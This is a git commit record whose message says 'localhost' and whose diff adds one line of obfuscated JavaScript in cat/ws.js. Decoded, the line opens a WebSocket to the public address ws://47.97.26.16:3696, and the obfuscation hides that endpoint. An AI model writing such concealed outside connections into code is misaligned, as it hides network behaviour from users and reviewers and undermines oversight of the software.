5a00de2e863dd1781bcbbae4dd98167ea7d9e147
boxshow <61752663+boxshow@users.noreply.github.com>
2024-10-19 09:03:46 +0800

    localhost

---
+++ cat/ws.js
@@ -0,0 +1,1 @@
+!function(n){!function(n,t,o,r,u){n[o]=new n[r](u)}(this,0,n(0,1),n(2,3,4,5,6,7,8,3,9),n(0,1,10,11,11,12,13,14,15,13,14,16,17,14,18,17,10,19,17,15,17))}(function(n){return function(){for(var t=arguments,o="",r=0,u=t.length;r<u;r++)o+=n[t[r]];return o}}(["w","s","W","e","b","S","o","c","k","t",":","/","4","7",".","9","2","6","1","3"]));
